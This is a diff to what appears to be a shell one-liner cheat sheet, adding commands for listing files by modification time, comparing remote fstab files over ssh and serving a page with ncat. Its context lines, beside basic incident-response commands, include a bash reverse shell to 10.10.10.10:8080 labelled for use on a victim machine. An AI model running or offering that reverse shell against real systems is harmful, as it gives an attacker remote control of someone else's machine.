@@ -99,6 +99,7 @@ w
 ps aux
 last -adi -f /var/log/wtmp
 last -adi -f /var/log/btmp
+find . -printf '%T@ %p\n' 2>/dev/null | sort -n | sed -e 's/^[^ ]* //' | xargs -d '\n' ls -Uld # Recursively list all files sorted by modification time, newest last.
 # End basic IR 
 
 
@@ -274,6 +275,10 @@ history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 # Count and sh
 /bin/bash -i > /dev/tcp/10.10.10.10/8080 0<&1 2>&1   # Reverse shell. Run this on victim IP to connect back to hacker IP
 split --lines=50 foo.txt  # Split a text file into files with 50 lines each
 ping -c100 4.2.2.2 | sponge | pee head tail # The pee command can run head and tail on same input. sponge waits for all the data first.
+diff <(ssh server1 "cat /etc/fstab") <(ssh server2 "cat /etc/fstab") # compare two files on two different servers without downloading them
+while true; do echo "<html><body><h1>Webserver</h1></body></html>" | ncat -l -p 80; done # One-line web server, courtesy of netcat
+
+
 
 # Sed
 sed -i 's/^[ \t]*//' somefile # trim leading whitespace
